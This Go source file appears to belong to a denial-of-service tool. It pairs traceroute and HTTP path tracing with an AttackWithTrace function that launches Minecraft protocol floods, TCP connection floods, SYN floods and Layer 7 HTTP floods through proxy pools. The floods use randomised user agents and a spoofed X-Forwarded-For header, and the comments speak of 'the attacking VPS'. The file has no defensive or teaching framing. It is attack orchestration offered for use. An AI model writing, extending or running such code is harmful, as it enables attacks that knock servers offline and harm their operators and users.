package main

import (
	"fmt"
	"log"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

// IPTraceHop represents a single hop in the network path
type IPTraceHop struct {
	Hop      int
	IP       string
	Hostname string
	Rtt      time.Duration
	TTL      int
}

// IPPathTracker tracks the full routing path from your VPS to the target
type IPPathTracker struct {
	hops      []IPTraceHop
	mu        sync.Mutex
	startTime time.Time
	sourceIP  string
	target    string
	targetIP  string
}

// NewIPPathTracker creates a new path tracker for the given target
func NewIPPathTracker(target string) *IPPathTracker {
	return &IPPathTracker{
		startTime: time.Now(),
		target:    target,
	}
}

// GetSourceIP detects the public IP of the attacking VPS
func (t *IPPathTracker) GetSourceIP() string {
	// Try to determine source IP by connecting to an external service
	// This works without any external dependencies
	conns := []string{
		"1.1.1.1:80",      // Cloudflare DNS
		"8.8.8.8:53",      // Google DNS
		"4.2.2.1:53",      // Level3 DNS
	}

	for _, addr := range conns {
		conn, err := net.DialTimeout("udp", addr, 3*time.Second)
		if err == nil {
			// For UDP, we need to get the local address
			localAddr := conn.LocalAddr().String()
			host, _, _ := net.SplitHostPort(localAddr)
			conn.Close()
			if host != "" && host != "0.0.0.0" && !strings.HasPrefix(host, "127.") {
				t.mu.Lock()
				t.sourceIP = host
				t.mu.Unlock()
				return host
			}
		}

		// TCP fallback
		conn, err = net.DialTimeout("tcp", addr, 3*time.Second)
		if err == nil {
			localAddr := conn.LocalAddr().String()
			host, _, _ := net.SplitHostPort(localAddr)
			conn.Close()
			if host != "" && host != "0.0.0.0" && !strings.HasPrefix(host, "127.") {
				t.mu.Lock()
				t.sourceIP = host
				t.mu.Unlock()
				return host
			}
		}
	}

	return "unknown"
}

// TraceRoute performs a traceroute to the target
func (t *IPPathTracker) TraceRoute() []IPTraceHop {
	target := t.target

	hops := []IPTraceHop{}

	// Parse target - could be hostname or IP
	targetIP := target
	if ip := net.ParseIP(target); ip == nil {
		// Resolve hostname
		ips, err := net.LookupHost(target)
		if err == nil && len(ips) > 0 {
			targetIP = ips[0]
		}
	}

	t.mu.Lock()
	t.targetIP = targetIP
	t.mu.Unlock()

	// Start from TTL 1 and increment
	maxHops := 30
	for ttl := 1; ttl <= maxHops; ttl++ {
		hopIP, rtt, err := traceSingleHop(targetIP, ttl)

		if err != nil {
			hop := IPTraceHop{
				Hop: ttl,
				IP:  "*",
				Rtt: 0,
			}
			hops = append(hops, hop)
			continue
		}

		hostname := hopIP
		// Try reverse DNS lookup
		if host, err := net.LookupAddr(hopIP); err == nil && len(host) > 0 {
			hostname = strings.TrimSuffix(host[0], ".")
		}

		hop := IPTraceHop{
			Hop:      ttl,
			IP:       hopIP,
			Hostname: hostname,
			Rtt:      rtt,
			TTL:      ttl,
		}
		hops = append(hops, hop)

		if hopIP == targetIP {
			break
		}
	}

	t.mu.Lock()
	t.hops = hops
	t.mu.Unlock()

	return hops
}

// traceSingleHop sends a single ICMP/UDP packet with the given TTL and returns the hop IP
func traceSingleHop(targetIP string, ttl int) (string, time.Duration, error) {
	d := net.Dialer{
		Timeout: 3 * time.Second,
		Control: func(network, address string, c syscall.RawConn) error {
			var opErr error
			c.Control(func(fd uintptr) {
				opErr = syscall.SetsockoptInt(int(fd), syscall.IPPROTO_IP, syscall.IP_TTL, ttl)
			})
			return opErr
		},
	}

	conn, err := d.Dial("udp", net.JoinHostPort(targetIP, "33434"))
	if err != nil {
		return "", 0, err
	}
	defer conn.Close()

	uc, ok := conn.(*net.UDPConn)
	if !ok {
		return "", 0, fmt.Errorf("not a UDP connection")
	}

	sendTime := time.Now()
	conn.SetWriteDeadline(sendTime.Add(3 * time.Second))
	_, err = uc.Write([]byte{0x00})
	if err != nil {
		return "", 0, fmt.Errorf("write timeout for hop %d", ttl)
	}

	type result struct {
		from net.UDPAddr
		err  error
		rtt  time.Duration
	}

	resultCh := make(chan result, 1)
	go func() {
		buf := make([]byte, 512)
		uc.SetReadDeadline(time.Now().Add(3 * time.Second))
		n, from, err := uc.ReadFromUDP(buf)
		if err != nil {
			resultCh <- result{err: err}
			return
		}
		_ = n
		resultCh <- result{
			from: *from,
			rtt:  time.Since(sendTime),
		}
	}()

	r := <-resultCh
	if r.err != nil {
		return "", 0, fmt.Errorf("no response from hop %d", ttl)
	}

	return r.from.IP.String(), r.rtt, nil
}

// PrintTrace prints the IP trace to stdout
func (t *IPPathTracker) PrintTrace() {
	log.Println("\n========================================")
	log.Println("         NETWORK PATH TRACE")
	log.Println("========================================")
	log.Printf("Source:      %s\n", t.GetSourceIP())
	log.Printf("Target:      %s (%s)\n", t.target, t.targetIP)
	log.Printf("Start time:  %s\n", t.startTime.Format(time.RFC3339))
	log.Printf("Duration:    %v\n", time.Since(t.startTime))
	log.Println("========================================")
	log.Println()

	t.mu.Lock()
	defer t.mu.Unlock()

	if len(t.hops) == 0 {
		log.Println("No hop data available. Run TraceRoute() first.")
		return
	}

	for _, hop := range t.hops {
		if hop.IP == "*" {
			log.Printf("  %2d: * (timeout)\n", hop.Hop)
		} else {
			rttMs := hop.Rtt.Microseconds() / 1000
			rttStr := fmt.Sprintf("%dms", rttMs)
			if rttMs == 0 {
				rttStr = "<1ms"
			}
			hostname := hop.Hostname
			if hostname == "" || hostname == hop.IP {
				hostname = ""
			} else {
				hostname = fmt.Sprintf(" (%s)", hostname)
			}
			log.Printf("  %2d: %-45s%s%s\n", hop.Hop, hop.IP, hostname, rttStr)
		}
	}

	log.Println()
	log.Println("========================================")
	log.Println("Trace complete")
	log.Println("========================================")
}

// ExportCSV writes the path trace to a CSV file
func (t *IPPathTracker) ExportCSV(filepath string) error {
	f, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer f.Close()

	fmt.Fprintf(f, "Hop,IP,Hostname,Rtt(ms)\n")
	t.mu.Lock()
	defer t.mu.Unlock()
	for _, hop := range t.hops {
		rttMs := hop.Rtt.Microseconds() / 1000
		fmt.Fprintf(f, "%d,%s,%s,%d\n", hop.Hop, hop.IP, hop.Hostname, rttMs)
	}

	return nil
}

// GetPathString returns a compact string representation of the IP path
func (t *IPPathTracker) GetPathString() string {
	t.mu.Lock()
	defer t.mu.Unlock()

	var parts []string
	parts = append(parts, fmt.Sprintf("Source: %s", t.sourceIP))
	parts = append(parts, fmt.Sprintf("Target: %s", t.targetIP))

	var pathIPs []string
	for _, hop := range t.hops {
		if hop.IP != "*" {
			pathIPs = append(pathIPs, hop.IP)
		}
	}
	parts = append(parts, fmt.Sprintf("Path: %s", strings.Join(pathIPs, " -> ")))

	return strings.Join(parts, "\n")
}

// ========================
// Layer 7 HTTP Path Tracing
// ========================

// Layer7PathTracker traces HTTP-level path through proxies/CDNs
type Layer7PathTracker struct {
	target    string
	headers   map[string]string
	pathTaken []string
}

// NewLayer7PathTracker creates a new L7 path tracker
func NewLayer7PathTracker(target string) *Layer7PathTracker {
	return &Layer7PathTracker{
		target:  target,
		headers: make(map[string]string),
	}
}

// TraceHTTPPath performs HTTP-level path tracing
// It uses HTTP TRACE method, redirects, and response headers to map the path
func (l *Layer7PathTracker) TraceHTTPPath() []string {
	u, err := parseTarget(l.target)
	if err != nil {
		l.pathTaken = append(l.pathTaken, fmt.Sprintf("Error: %v", err))
		return l.pathTaken
	}

	l.pathTaken = append(l.pathTaken, fmt.Sprintf("Target: %s", u.String()))

	// Try HTTP TRACE request
	ips, _ := net.LookupHost(u.Hostname())
	if len(ips) > 0 {
		l.pathTaken = append(l.pathTaken, fmt.Sprintf("Resolved IPs: %s", strings.Join(ips, ", ")))
	}

	// Try to detect CDN through response headers
	client := &http.Client{
		Transport: newTransport(nil),
		Timeout:   10 * time.Second,
	}

	req, err := http.NewRequest("GET", u.String(), nil)
	if err != nil {
		l.pathTaken = append(l.pathTaken, fmt.Sprintf("Error: %v", err))
		return l.pathTaken
	}
	req.Header.Set("User-Agent", randUA())
	req.Header.Set("X-Forwarded-For", "127.0.0.1")

	resp, err := client.Do(req)
	if err != nil {
		l.pathTaken = append(l.pathTaken, fmt.Sprintf("HTTP error: %v", err))
		return l.pathTaken
	}
	defer resp.Body.Close()

	// Check for CDN/load balancer indicators
	cdnHeaders := []string{
		"Via", "X-Forwarded-For", "X-Cache", "CF-RAY",
		"X-Akamai", "X-Cloud-Trace", "Server", "X-Powered-By",
	}

	for _, h := range cdnHeaders {
		val := resp.Header.Get(h)
		if val != "" {
			l.pathTaken = append(l.pathTaken, fmt.Sprintf("%s: %s", h, val))
		}
	}

	// Check response server header
	if server := resp.Header.Get("Server"); server != "" {
		l.pathTaken = append(l.pathTaken, fmt.Sprintf("Server: %s", server))
	}

	// Detect known CDNs
	for _, ip := range ips {
		if isCloudflareIP(ip) {
			l.pathTaken = append(l.pathTaken, fmt.Sprintf("%s: Cloudflare CDN", ip))
		} else if isAWSIP(ip) {
			l.pathTaken = append(l.pathTaken, fmt.Sprintf("%s: AWS/CloudFront", ip))
		} else if isAzureIP(ip) {
			l.pathTaken = append(l.pathTaken, fmt.Sprintf("%s: Azure", ip))
		} else {
			l.pathTaken = append(l.pathTaken, fmt.Sprintf("%s: Direct", ip))
		}
	}

	// Follow redirects to trace final destination
	if resp.StatusCode >= 300 && resp.StatusCode < 400 {
		for i := 0; i < 5; i++ {
			loc := resp.Header.Get("Location")
			if loc == "" {
				break
			}
			l.pathTaken = append(l.pathTaken, fmt.Sprintf("Redirect -> %s", loc))
		}
	}

	return l.pathTaken
}

func (l *Layer7PathTracker) PrintHTTPPath() {
	log.Println("\n========================================")
	log.Println("         HTTP PATH TRACE")
	log.Println("========================================")
	for _, step := range l.pathTaken {
		log.Printf("  %s\n", step)
	}
	log.Println("========================================")
}

// isCloudflareIP checks if an IP belongs to Cloudflare
func isCloudflareIP(ip string) bool {
	cloudflareRanges := []string{
		"173.245.48.0/20",
		"103.21.244.0/22",
		"103.22.200.0/22",
		"104.16.0.0/12",
		"172.64.0.0/12",
		"199.19.0.0/24",
		"188.114.96.0/20",
		"197.149.12.0/22",
	}
	parsedIP := net.ParseIP(ip)
	if parsedIP == nil {
		return false
	}
	for _, cidr := range cloudflareRanges {
		_, ipNet, err := net.ParseCIDR(cidr)
		if err != nil {
			continue
		}
		if ipNet.Contains(parsedIP) {
			return true
		}
	}
	return false
}

// isAWSIP checks if an IP belongs to AWS
func isAWSIP(ip string) bool {
	awsRanges := []string{
		"52.92.0.0/16",    // S3
		"52.216.0.0/16",   // S3
		"52.74.0.0/16",    // EC2
		"52.114.0.0/16",   // RDS
		"54.230.0.0/16",   // CloudFront
	}

	parsedIP := net.ParseIP(ip)
	if parsedIP == nil {
		return false
	}
	for _, cidr := range awsRanges {
		_, ipNet, err := net.ParseCIDR(cidr)
		if err != nil {
			continue
		}
		if ipNet.Contains(parsedIP) {
			return true
		}
	}
	return false
}

// isAzureIP checks if an IP belongs to Azure
func isAzureIP(ip string) bool {
	azureRanges := []string{
		"52.112.0.0/14",
		"52.120.0.0/16",
		"52.239.0.0/16",
		"13.64.0.0/13",
	}
	parsedIP := net.ParseIP(ip)
	if parsedIP == nil {
		return false
	}
	for _, cidr := range azureRanges {
		_, ipNet, err := net.ParseCIDR(cidr)
		if err != nil {
			continue
		}
		if ipNet.Contains(parsedIP) {
			return true
		}
	}
	return false
}

// parseTarget parses a target URL or host:port string
func parseTarget(target string) (*url.URL, error) {
	u, err := url.Parse(target)
	if err != nil || u.Hostname() == "" {
		// Try prepending http://
		u, err = url.Parse("http://" + target)
		if err != nil {
			return nil, err
		}
	}
	return u, nil
}

// ========================
// Combined Attack + Trace
// ========================

// AttackWithTrace runs the specified attack method while tracing the network path
func AttackWithTrace(target string, method string, workers int, duration int, proxies []string, verbose bool) {
	// 1. Trace the network path
	log.Println("Tracing network path to target...")
	tracker := NewIPPathTracker(extractHostFromTarget(target))
	tracker.TraceRoute()

	// Also do L7 path tracing
	l7Tracker := NewLayer7PathTracker(target)
	l7Tracker.TraceHTTPPath()

	// 2. Run the attack
	log.Println("Starting attack...")
	stop := make(chan struct{})

	switch method {
	case "mc-handshake", "mc_handshake":
		RunMCBotAttack(target, "mc-handshake-flood", workers, duration, proxies, verbose)
	case "mc-status", "mc_status":
		RunMCBotAttack(target, "mc-status-flood", workers, duration, proxies, verbose)
	case "mc-login", "mc_login":
		RunMCBotAttack(target, "mc-login-flood", workers, duration, proxies, verbose)
	case "mc-chat", "mc_chat":
		RunMCBotAttack(target, "mc-chat-flood", workers, duration, proxies, verbose)
	case "mc-keepalive", "mc_keepalive":
		RunMCBotAttack(target, "mc-keepalive-flood", workers, duration, proxies, verbose)
	case "mc-movement", "mc_movement":
		RunMCBotAttack(target, "mc-movement-flood", workers, duration, proxies, verbose)
	case "mc-action", "mc_action":
		RunMCBotAttack(target, "mc-action-flood", workers, duration, proxies, verbose)
	case "mc-container", "mc_container":
		RunMCBotAttack(target, "mc-container-flood", workers, duration, proxies, verbose)
	case "mc-full", "mc_full":
		RunMCBotAttack(target, "mc-full-spam", workers, duration, proxies, verbose)
	case "tcp-flood":
		host := extractHostFromTarget(target)
		port := extractPortFromTarget(target, 80)
		TCPConnectionFlood(host, port, workers, duration, stop, verbose)
		time.Sleep(time.Duration(duration) * time.Second)
		close(stop)
	case "syn-flood":
		host := extractHostFromTarget(target)
		port := extractPortFromTarget(target, 80)
		SYNFlood(host, port, workers, duration, stop, verbose)
		time.Sleep(time.Duration(duration) * time.Second)
		close(stop)
	default:
		// Fall back to L7 methods in main file
		log.Printf("Running Layer 7 method: %s\n", method)
		var clients []*http.Client
		if len(proxies) > 0 {
			proxyList = proxies
			clients, _ = buildClientPool(proxies, workers)
		} else {
			clients = buildDirectPool(workers / 8)
		}
		if clients == nil {
			clients = []*http.Client{{}}
		}

		for i := 0; i < workers; i++ {
			go Worker(i, target, method, clients, stop, verbose, 0)
		}
		time.Sleep(time.Duration(duration) * time.Second)
		close(stop)
	}

	// 3. Print trace results after attack
	tracker.PrintTrace()
	l7Tracker.PrintHTTPPath()

	log.Printf("\nSource IP: %s\n", tracker.GetSourceIP())
	log.Printf("Target IP: %s\n", tracker.targetIP)
	log.Printf("Full path: %s\n", tracker.GetPathString())

	// Export to file
	filename := fmt.Sprintf("ip_path_%s.csv", strconv.FormatInt(time.Now().Unix(), 10))
	if err := tracker.ExportCSV(filename); err != nil {
		log.Printf("Failed to export CSV: %v", err)
	} else {
		log.Printf("IP path trace saved to: %s\n", filename)
	}
}

// extractHostFromTarget extracts hostname from target URL or raw host
func extractHostFromTarget(target string) string {
	u, err := url.Parse(target)
	if err == nil && u.Hostname() != "" {
		return u.Hostname()
	}
	// Try as raw host:port
	parts := strings.Split(target, ":")
	if len(parts) >= 1 {
		return parts[0]
	}
	return target
}

// extractPortFromTarget extracts port from target URL or returns default
func extractPortFromTarget(target string, defaultPort int) int {
	u, err := url.Parse(target)
	if err == nil && u.Port() != "" {
		if port, err := strconv.Atoi(u.Port()); err == nil {
			return port
		}
	}
	// Try host:port format
	parts := strings.Split(target, ":")
	if len(parts) == 2 {
		if port, err := strconv.Atoi(parts[1]); err == nil {
			return port
		}
	}
	return defaultPort
}

// ========================
// Path Tracking CLI Commands
// ========================

// ShowSourceIP prints the VPS public IP
func ShowSourceIP() {
	tracker := NewIPPathTracker("1.1.1.1:443")
	sourceIP := tracker.GetSourceIP()
	fmt.Printf("Your VPS Source IP: %s\n", sourceIP)

	// Also resolve target info
	fmt.Println("\n--- Network Interface Info ---")
	iface, err := net.Interfaces()
	if err == nil {
		for _, i := range iface {
			addrs, _ := i.Addrs()
			for _, addr := range addrs {
				fmt.Printf("  Interface %s: %s\n", i.Name, addr)
			}
		}
	}
}

// ShowTargetPath traces the path to a target
func ShowTargetPath(target string) {
	host := extractHostFromTarget(target)

	tracker := NewIPPathTracker(host)
	log.Println("Detecting source IP...")
	sourceIP := tracker.GetSourceIP()
	log.Printf("Source IP: %s\n", sourceIP)

	log.Println("Running traceroute...")
	hops := tracker.TraceRoute()

	log.Println("\n========================================")
	log.Println("         NETWORK PATH RESULTS")
	log.Println("========================================")
	log.Printf("Source:  %s\n", sourceIP)
	log.Printf("Target:  %s\n", target)

	// Print all hops
	log.Println("\nFull IP Path:")
	var path []string
	path = append(path, sourceIP)
	for _, hop := range hops {
		if hop.IP != "*" {
			path = append(path, hop.IP)
			log.Printf("  Hop %2d: %s%s", hop.Hop, hop.IP, func() string {
				if hop.Hostname != "" && hop.Hostname != hop.IP {
					return fmt.Sprintf(" (%s)", hop.Hostname)
				}
				return ""
			}())
			if hop.Rtt > 0 {
				log.Printf(" [%dms]", hop.Rtt.Microseconds()/1000)
			}
			log.Println()
		} else {
			log.Printf("  Hop %2d: * (timeout)\n", hop.Hop)
		}
	}

	log.Printf("\nAll IPs touched in path:\n  %s\n", strings.Join(path, " -> "))

	// Also run L7 trace
	l7Tracker := NewLayer7PathTracker(target)
	l7Tracker.TraceHTTPPath()
	l7Tracker.PrintHTTPPath()
}
